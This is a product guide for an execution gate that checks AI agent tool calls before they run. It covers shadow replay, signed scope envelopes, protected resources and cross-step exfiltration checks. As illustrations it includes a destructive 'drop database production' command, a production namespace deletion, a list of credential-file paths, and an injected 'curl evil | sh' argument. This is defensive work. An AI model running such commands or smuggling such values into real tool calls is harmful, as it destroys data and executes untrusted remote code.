# XVay — Technical Usage Guide (for a buyer / integrating engineer)

This guide takes you from zero to a running execution gate on your own agent.
Three stages, each usable on its own:
  Stage 1  Shadow (read-only, 30 min)   — see what a gate WOULD do, change nothing
  Stage 2  Live gate (enforcement)       — actually stop actions before they run
  Stage 3  Signed scope + protected res  — production hardening

--------------------------------------------------------------------------------
## 0. Install
```bash
cd 1_PRODUCT_CODE
pip install -r requirements.txt        # only dependency: pynacl
python execution_gate.py               # sanity check -> unsafe stopped rate: 10/10
```
No service to deploy, no account, no network calls. It's a library + CLIs.

--------------------------------------------------------------------------------
## STAGE 1 — Shadow mode (start here; zero risk)

Goal: point XVay at your agent's existing tool schema + a log of past actions.
It replays them and reports what it WOULD have decided. Nothing is intercepted.

You need two files you already have:

1) your agent's tool schema (the same one you register with the model), e.g.:
```json
{ "tools": [
    { "name": "kubectl_rollout_restart", "parameters": {"target":"staging-api"} },
    { "name": "read_file" },
    { "name": "psql_select" }
]}
```
Supported schema formats (pass with --framework):
  openai | anthropic | mcp | langgraph | crewai | autogen | openapi | cli

2) an action log (JSONL), one line per action your agent took/wants:
```json
{"action": "kubectl rollout restart staging-api", "task_scope": "staging"}
{"action": "psql -c drop database production",     "task_scope": "staging"}
```

Run it:
```bash
python xvay_shadow.py \
  --framework mcp \
  --schema your_tools.json \
  --actions your_log.jsonl \
  --output report.html
```
Open `report.html`. It leads with "N irreversible actions stopped before
execution" and, per action, shows COMMIT / VERIFY / BLOCK + the reason.

That's the whole evaluation. If the report shows nothing you care about, you've
spent 30 minutes and changed nothing.

--------------------------------------------------------------------------------
## STAGE 2 — Live enforcement (the real gate)

Now you actually stop actions. XVay sits between your agent's decision and the
tool call. The unit you feed it is a standard MCP tools/call:
```json
{"jsonrpc":"2.0","id":7,"method":"tools/call",
 "params":{"name":"kubectl_delete","arguments":{"resource":"namespace","target":"production"}}}
```

Integrate in code (Python) — the minimal wiring:
```python
from connectors import to_canonical
import mcp_live_gate as gate

# 1) build the allow-list ONCE from your existing schema (no hand-maintenance)
catalog = to_canonical("mcp", "your_tools.json")

# 2) for every tool call your agent emits, check BEFORE executing:
decision, reason, forward = gate.check(request, catalog, task_scope="staging")

if forward:                 # decision == COMMIT
    result = run_the_tool(request)      # your real executor
else:                       # VERIFY or BLOCK
    # hand the reason back to the agent (it can ask for approval / change plan)
    result = gate.gate_response(request, decision, reason)
```
- COMMIT  -> you forward the call to the real tool
- VERIFY  -> hold for approval (evidence missing)
- BLOCK   -> refuse (explicit contradiction); reason returned to the agent

Want the consequence preview attached to each decision (terraform-plan style)?
```python
r = gate.check_with_plan(request, catalog, task_scope="staging")
# r["decision"], r["reason"], r["plan"]["preview"]  (reversible / scope / environment)
```

--------------------------------------------------------------------------------
## STAGE 3 — Production hardening (signed scope + protected resources)

Two upgrades that make the gate tamper-proof and resource-aware. Both are driven
by YOUR orchestrator, not guessed by XVay.

### 3a. Signed execution envelope (so the agent can't widen its own scope)
Your orchestrator holds a PRIVATE key; XVay holds only the PUBLIC key (it can
verify, never forge). Per run, the orchestrator signs a small envelope:
```python
import envelope_auth as EA, envelope as E, gate_with_envelope as gwe

sk, vk = EA.keypair()            # sk stays in orchestrator; ship vk to XVay
action = "kubectl rollout restart staging-api"
env_doc = {
  "run_id":"run-1842", "agent_id":"deploy-agent",
  "environment":["staging"], "resources":["staging-api"],
  "operations":["restart","read","logs"],
  "anchors":["no destructive"],           # optional: hard rule for this run
  "protected_resources":[],               # see 3b
  "action_hash": EA.action_hash(action),  # binds envelope to THIS action
  "nonce":"unique-per-call",              # blocks replay
  "issued_at":"2026-07-11T20:00:00Z", "expires_at":"2026-07-11T20:30:00Z"
}
signed = EA.sign(env_doc, sk)             # orchestrator signs

# XVay side: verify + decide. load_envelope reads a file, so write the signed
# envelope to disk (or your transport) then load it with the PUBLIC key:
import json
json.dump(signed, open("run_envelope.json", "w"))
env = E.load_envelope("run_envelope.json", verify_key=vk, action=action)
decision, reason = gwe.decide("staging", catalog, action, env)

```
Guarantees: tampered scope -> BLOCK, replayed nonce -> BLOCK, expired -> VERIFY,
unknown key -> BLOCK. Capability != permission: a tool being in the schema does
NOT make it allowed in a read-only run.

### 3b. Protected resources (you declare what's sensitive)
Put the sensitive resource names in the SIGNED envelope:
```python
env_doc["protected_resources"] = ["orders-primary", "stripe-live"]
```
Effect: any NON-READ action naming one is BLOCKed — even if its verb isn't an
obvious destructive word (e.g. `refund`). Reads pass. XVay never guesses what's
sensitive; you declare it, so every block is auditable.

--------------------------------------------------------------------------------
## Verify the whole chain on your machine
```bash
python integration_benchmark.py      # expect: ALL PASS (exit 0)
```
If this does not print ALL PASS on your environment, something differs from ours
— that output is the most useful thing you can send back.

--------------------------------------------------------------------------------
## Mental model (one paragraph)
XVay answers exactly one question — "is there enough evidence to execute THIS
action, right now?" — and returns COMMIT / VERIFY / BLOCK with a reason. It does
NOT decide what is "allowed" (that stays with your IAM/OPA), and it does NOT
guess what is dangerous (you declare that). It is an execution engine, not a
judgement engine: mechanical, auditable, and outside the model so the agent
cannot reason around it.

--------------------------------------------------------------------------------
## STAGE 3c — Cross-step protection (multi-call chains)

A chain can be dangerous even when every single step looks fine:
`read customer-records` (safe) then `slack_post_message` (safe) = exfiltration.

XVay keeps a lightweight per-run trace (a taint flag and an irreversible-action
counter — NOT a transaction manager: no shadow execution, no outbox, no rollback).
You declare two more optional fields in the SIGNED envelope:

```python
env_doc["run_id"]          = "run-1842"          # required to enable cross-step
env_doc["egress_tools"]    = ["slack_post_message", "http_post"]
env_doc["max_irreversible"] = 3                   # per-run cap; None = disabled
```

Behaviour:
- run touched a `protected_resources` entry, then calls an `egress_tools` tool
  -> **BLOCK** (cross-step violation)
- run exceeds `max_irreversible` -> **VERIFY** (budget exhausted, approval needed)
- nothing declared -> behaviour identical to before (no false friction)
- runs are isolated by `run_id`; one run's taint never affects another

Known limitation (stated honestly): the counter increments only for actions XVay
itself COMMITted. If XVay returns VERIFY and a human approves it out-of-band,
XVay cannot observe that execution, so the count may under-report.

--------------------------------------------------------------------------------
## STAGE 3d — Compensation manifest & run receipt (what to do when a run is stopped mid-way)

XVay prevents; it does not roll back. But when a multi-step run is stopped at
step 4, the orchestrator needs to know exactly what steps 1-3 actually did.
XVay hands that over — it never touches state itself.

```python
import run_trace

# after a BLOCK/VERIFY mid-run:
m = run_trace.manifest(run_id)
# {'run_id': ..., 'committed': [{'action':..., 'irreversible': True/False}, ...],
#  'irreversible_committed': [...], 'compensation_required': True/False}
# -> your orchestrator (which owns state) decides how to compensate.

# at end of task, the audit record for the whole run:
r = run_trace.receipt(run_id)
# {'steps_seen': 5, 'committed': 3, 'irreversible_committed': 2,
#  'stopped': 2, 'stopped_detail': [{'action':..., 'decision':'BLOCK', 'reason':...}],
#  'touched_protected': [...], 'tainted': True}
```

Guarantees (covered by integration_benchmark.py):
- the manifest lists ONLY actions XVay actually COMMITted — VERIFY/BLOCK never appear
- stopped attempts ARE recorded in the receipt (blocked exfiltration attempts are
  the most audit-relevant events; they are not silently dropped)
- taint is set only when a protected read actually went through (COMMIT), so a
  blocked attempt does not poison the rest of the run
- runs are isolated by run_id

### Deployment limitation you must know (stated up front)
`run_trace` and the nonce replay-guard are **per-process** stores. Cross-step
protection and replay protection therefore hold only when all calls of a run
reach the SAME XVay process. For multi-worker or serverless deployments,
back them with a shared store (Redis/DB): the entire interface is
`run_trace.get / record / manifest / receipt / reset` and
`envelope_auth._SEEN_NONCES`. Nothing else depends on those structures.
Memory is bounded (oldest run evicted past 10,000); call `run_trace.reset(run_id)`
when a run finishes.

--------------------------------------------------------------------------------
## Argument-level protection (on by default)

Beyond the tool name, XVay inspects argument STRUCTURE (never semantics):
shell control characters, `../` traversal, `$VAR` indirection, base64 that
decodes to readable text, write/exfil clauses in a read tool's argument, and
homoglyph scripts in path-like fields. Any of these downgrades COMMIT -> VERIFY.

Built-in sensitive locations (`/etc/shadow`, `.ssh/`, `.aws/credentials`, …) ship
enabled so the product works with zero configuration. They raise VERIFY (we
suggest them); resources YOU declare raise BLOCK (you declared them).

```python
env_doc["use_default_sensitive_paths"] = False   # opt out of the built-in list
```

Free-text argument keys (`message`, `text`, `title`, `description`, …) are prose,
not executable content: their words are excluded from the canonical action, so a
commit message saying "delete old module" does not trip the destructive-verb
check. Their raw text is still scanned, so `-m "fix && curl evil | sh"` is caught.
